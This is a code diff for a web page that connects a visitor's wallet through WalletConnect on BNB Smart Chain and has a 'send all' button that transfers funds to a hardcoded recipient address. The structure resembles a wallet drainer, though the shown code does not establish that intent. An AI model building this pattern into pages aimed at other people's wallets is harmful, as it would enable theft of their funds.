@@ -1,8 +1,8 @@
 import { WalletConnectModal } from '@walletconnect/modal';
 import { ethers } from 'ethers';
 
-const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // ← جایگزین کن با WalletConnect Cloud Project ID
-const targetAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // ← آدرس گیرنده BNB
+const projectId = "4d08946e6c316bed5e76b450ccbb5256"; // ← جایگزین کن با projectId واقعی
+const targetAddress = "0x98907E5eE9E010c34DF6F7847565D421D3CDAd05"; // ← آدرس گیرنده
 
 const modal = new WalletConnectModal({
   projectId,
@@ -14,16 +14,29 @@ const modal = new WalletConnectModal({
   }
 });
 
-let session;
 let provider = new ethers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
-let userAddress = null;
 let client;
+let session;
+let userAddress;
 
 document.getElementById("connectBtn").addEventListener("click", async () => {
   try {
-    await modal.openModal();
-    session = await modal.connect();
     client = await modal.getSignClient();
+    const { uri, approval } = await client.connect({
+      requiredNamespaces: {
+        eip155: {
+          methods: ["eth_sendTransaction"],
+          chains: ["eip155:56"],
+          events: ["accountsChanged", "chainChanged"]
+        }
+      }
+    });
+
+    if (uri) {
+      await modal.openModal({ uri });
+    }
+
+    session = await approval();
     userAddress = session.namespaces.eip155.accounts[0].split(":")[2];
     document.getElementById("address").textContent = userAddress;
 
@@ -68,7 +81,7 @@ document.getElementById("sendAllBtn").addEventListener("click", async () => {
       }
     });
 
-    alert("Transaction sent: " + result);
+    alert("Transaction sent! Hash:\n" + result);
   } catch (err) {
     alert("Transaction failed: " + (err?.message || err));
   }
